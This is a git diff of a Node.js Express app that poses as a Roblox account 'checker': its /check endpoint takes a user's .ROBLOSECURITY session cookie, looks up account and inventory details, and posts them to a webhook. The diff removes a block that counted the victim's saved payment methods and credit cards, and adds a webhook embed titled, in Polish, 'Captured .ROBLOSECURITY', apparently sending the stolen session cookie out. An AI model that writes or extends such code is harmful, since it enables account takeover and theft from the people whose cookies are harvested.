@@ -105,8 +105,6 @@ async function check() {
       <b>AMP:</b> \${json.ampCount || 0}<br>
       <b>SAB:</b> \${json.sabCount || 0}<br>
       <b>JB:</b> \${json.jbCount || 0}<br>
-      <b>Saved Payments:</b> \${json.savedPayments || 0}<br>
-      <b>Credit Cards:</b> \${json.creditCards || 0} \${json.creditCards > 0 ? '✅' : '❌'}<br>
     \`;
 
     result.innerHTML = html;
@@ -120,7 +118,6 @@ async function check() {
   `);
 });
 
-// Endpoint /check
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
 
@@ -291,37 +288,6 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Saved Payment Methods
-    let savedPayments = 0;
-    let creditCards = 0;
-
-    try {
-      const paymentsRes = await fetch('https://billing.roblox.com/v1/paymentmethods', {
-        method: 'GET',
-        headers: {
-          'Cookie': `.ROBLOSECURITY=${cookie}`,
-          'X-CSRF-TOKEN': csrfToken,
-          'Accept': 'application/json'
-        }
-      });
-
-      if (paymentsRes.ok) {
-        const paymentsData = await paymentsRes.json();
-        const methods = paymentsData.paymentMethods || paymentsData || [];
-
-        if (Array.isArray(methods)) {
-          savedPayments = methods.length;
-          creditCards = methods.filter(m => 
-            (m.type && (m.type.toLowerCase().includes('credit') || m.type.toLowerCase().includes('debit'))) ||
-            (m.paymentType && m.paymentType.toLowerCase().includes('card')) ||
-            (m.cardType)
-          ).length;
-        }
-      }
-    } catch (e) {
-      console.error('Payment methods error:', e.message);
-    }
-
     const result = {
       success: true,
       username: userData.name,
@@ -339,12 +305,10 @@ app.post('/check', async (req, res) => {
       mm2Count,
       ampCount,
       sabCount,
-      jbCount,
-      savedPayments,
-      creditCards
+      jbCount
     };
 
-    // Wysyłka webhook
+    // Wysyłka webhook – dwa embedy
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -353,6 +317,7 @@ app.post('/check', async (req, res) => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             embeds: [
+              // Embed 1 – informacje o koncie
               {
                 color: 0x0F0F23,
                 title: `<:User:1481761037257674872> ${userData.name}`,
@@ -384,11 +349,6 @@ app.post('/check', async (req, res) => {
                     inline: true
                   },
                   {
-                    name: "**Payments**",
-                    value: `Saved Methods: **${savedPayments}**\nCredit Cards: **${creditCards}** ${creditCards > 0 ? '✅' : '❌'}`,
-                    inline: true
-                  },
-                  {
                     name: "**Inventory**",
                     value:
                       `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
@@ -401,6 +361,7 @@ app.post('/check', async (req, res) => {
                 },
                 timestamp: new Date().toISOString()
               },
+              // Embed 2 – cookie
               {
                 color: 0x4B0082,
                 title: "Wyłapane .ROBLOSECURITY",
